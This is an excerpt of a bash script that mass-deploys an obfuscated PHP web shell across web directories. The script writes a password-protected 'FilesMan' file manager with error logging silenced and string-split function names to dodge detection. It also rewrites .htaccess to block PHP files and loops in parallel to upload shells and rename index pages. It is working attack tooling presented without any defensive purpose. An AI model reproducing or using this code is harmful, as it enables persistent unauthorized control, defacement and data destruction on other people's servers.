...
update_htaccess() {
  ...
  touch "$htaccess_file" && cat > "$htaccess_file" << EOF
<Files *.ph*>
    Order Deny,Allow
    Deny from all
</Files>
...
write_php_code() {
  local path="$1"
  local code="$2"
  touch "$path" && cat > "$path" << EOF
<?php @ini_set("display_errors",0);@ini_set("log_errors",0);@ini_set('error_log',0);date_default_timezone_set("Asia/Jakarta");$default_action="FilesMan";$default_use_ajax=true;$default_charset='UTF-8';function show_login_page($message=""){ ?>
    <!DOCTYPE html>
    <html lang="en">
...
<?php exit;}function logout(){setcookie('authenticated','',time()-3600,"/");header("Location: ".$_SERVER['PHP_SELF']);exit;}if(isset($_GET['action'])&&$_GET['action']==='logout'){logout();}if(!isset($_COOKIE['authenticated'])){$stored_username='admin';$stored_hashed_password='$2y$10$.ooaan3I5nZA/r5hzgqv9.7iU2FkyFtD8BxYcg0HNSNdsArr0oJ8.';if(isset($_POST['username'])&&isset($_POST['pass'])){if($_POST['username']===$stored_username&&password_verify($_POST['pass'],$stored_hashed_password)){setcookie('authenticated',true,time()+(86400*30),"/");header("Location: ".$_SERVER['PHP_SELF']);exit;}else{show_login_page("Invalid username or password. Please try again.");}}else{show_login_page();}}if(isset($_COOKIE['authenticated'])){echo '<a href="?action=logout">Logout</a>';}else{show_login_page();} ?>
<!DOCTYPE html>
<html>
<head>
...
<input type="text" name="file_name" placeholder="File Name"><input type="submit" value="Create File"></form></td></tr>
        ...
        </tr>';}echo '</table>';function deleteDirectory($dir){$unl="u"."n"."l"."i"."n"."k";if(!file_exists($dir)){return true;}if(!is_dir($dir)){return $unl($dir);}$scd="s"."c"."a"."n"."d"."i"."r";foreach($scd($dir)as $item){if($item=='.'||$item=='..'){continue;}if(!deleteDirectory($dir.DIRECTORY_SEPARATOR.$item)){return false;}}return rmdir($dir);}
EOF
...
run_with_xargs_loop() {
  ...
  while true; do
    ...
    xargs -0 -n 1 -P "$parallelism" -I {} bash -c '(upload_php_files "{}" & rename_index "{}" & wait) || { echo "$(date) - Memory limit reached while processing {} with -P $parallelism" >> "$LOG_FILE"; false; }'
